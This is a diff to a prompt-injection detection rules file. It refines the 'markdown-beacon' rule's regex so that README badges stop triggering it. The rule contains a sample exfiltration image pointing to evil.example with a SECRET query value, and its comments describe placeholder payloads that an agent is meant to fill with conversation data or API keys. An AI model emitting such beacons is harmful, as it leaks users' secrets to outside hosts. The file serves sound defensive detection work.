@@ -111,7 +111,7 @@ patterns:
     tags: [exfiltration, url]
   - id: PI026
     example: "![x](https://evil.example/pixel.png?q=SECRET)"
-    counter_example: "![logo](https://cdn.example/logo.png)"
+    counter_example: "[![Docs](https://readthedocs.org/projects/requests/badge/?version=latest)](https://requests.readthedocs.io)"
     name: markdown-beacon
     # HIGH: only an exfil channel if the agent renders markdown and fetches URLs.
     # CRITICAL fails CI on prose repos with legitimate tracking pixels.
@@ -122,8 +122,26 @@ patterns:
     # bare numeric value is an identifier. Requiring the leading `!` was tried
     # first and rejected -- it would have silently dropped the plain-link beacon
     # an existing test asserts, and a link is still a live channel once clicked.
+    #
+    # THE VALUE'S SHAPE IS THE FALSE-POSITIVE CONTROL. `=[0-9]*[A-Za-z_%\-]`
+    # accepted any value with a letter in it, and the badge row every popular
+    # README opens with is exactly that: `?version=latest`, `?branch=main`,
+    # `?style=flat-square` -- two HIGH findings on psf/requests's README, see
+    # `clean/badged-readme.md`. A beacon has to CARRY the data it exfiltrates,
+    # so its value is one of three shapes and a badge's is none of them:
+    #   1. a placeholder the model is meant to fill -- bracketed
+    #      (`?c=[conversation summary]`, `?d={{context}}`) or an ALL-CAPS token
+    #      (`?q=SECRET`, `?x=INSERT_API_KEY_HERE`). The caps arm is `(?-i:...)`
+    #      because patterns compile case-insensitively; a lower-case word is a
+    #      badge parameter, an upper-case one is a template slot.
+    #   2. already-encoded data, 24+ characters -- base64 of anything worth
+    #      stealing is at least that long, and no badge parameter is.
+    # Known cost: a long url-encoded badge label (`?label=Continuous%20Integration`)
+    # or a GitHub dependents link (`?package_id=` + 30 chars of base64) still
+    # fires. Both are rarer than the values above, and the second really is
+    # an opaque blob in a query string.
     severity: HIGH
-    pattern: "!?\\[[^\\]]*\\]\\(https?://[^\\s\\)]*\\?[^\\s\\)]*=[0-9]*[A-Za-z_%\\-]"
+    pattern: "!?\\[[^\\]]*\\]\\(https?://[^\\s\\)]*\\?[^\\s\\)]*=(?:(?-i:[A-Z][A-Z0-9_]{3,})\\b|[\\[{<][^\\)]*|[^\\s\\)&]{24,})"
     description: "Markdown image/link beacon that can exfiltrate context via query parameters"
     remediation: "Remove markdown links/images whose query string encodes secrets or conversation data."
     tags: [exfiltration, markdown, url]
